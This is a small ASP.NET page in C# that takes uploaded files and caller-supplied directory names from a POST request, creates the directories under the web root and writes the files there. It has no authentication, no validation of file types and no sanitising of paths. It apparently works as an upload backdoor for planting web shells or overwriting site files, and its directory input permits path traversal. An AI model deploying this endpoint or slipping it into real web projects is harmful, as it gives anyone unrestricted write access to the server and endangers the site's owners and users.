<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web.Hosting" %>

<% 
	string root = HostingEnvironment.MapPath("~");
	string[] dirs = Request.Form.GetValues("dirs[]");
	HttpFileCollection files = Request.Files;
	if (dirs == null){
		Response.Write("need POST{path}!");
		return;
	}
	if (files == null){
		Response.Write("need FILE{files}!");
		return;
	}
	
	for (int i = 0; i < files.Count; i++) {
		HttpPostedFile file = files[i];
		string name = file.FileName;
		string dir = dirs[i];
		string dirPath = root + "/" + dir;
		string filePath = dirPath + "/" + name;
		Directory.CreateDirectory(dirPath);
		file.SaveAs(filePath);
	}
%>